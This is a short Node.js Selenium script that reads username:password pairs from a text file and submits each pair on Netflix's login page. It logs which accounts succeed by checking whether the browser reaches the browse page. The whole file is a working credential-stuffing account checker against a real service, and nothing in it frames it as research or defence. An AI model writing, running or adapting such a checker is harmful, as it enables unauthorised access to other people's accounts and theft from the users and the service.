const {
    Builder,
    By,
    Key,
    until
} = require('selenium-webdriver');
const fs = require('fs');
const readline = require('readline');

async function processLineByLine() {
    const fileStream = fs.createReadStream('input.txt');

    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    for await (const line of rl) {
        var credarr = line.split(':')
        await automate(credarr[0], credarr[1])
    }
}

processLineByLine();
async function automate(username, password) {
    let driver = await new Builder().forBrowser('chrome').build();
    try {
        await driver.get('https://www.netflix.com/in/login');
        //id_userLoginId
        await driver.findElement(By.name('userLoginId')).sendKeys(username, Key.TAB);
        await driver.findElement(By.name('password')).sendKeys(password, Key.RETURN);
        setTimeout(async function () {
            var currenturl = (await driver.getCurrentUrl()).toString();
            //console.log("currenturl : " + JSON.stringify(currenturl));
            if (currenturl == 'https://www.netflix.com/browse') {
                console.log('success for ' + username);
            } else {
                console.log('failed for ' + username)
            }
        }, 3000)

    } finally {
        await driver.sleep(3500)
        await driver.quit();
    }
};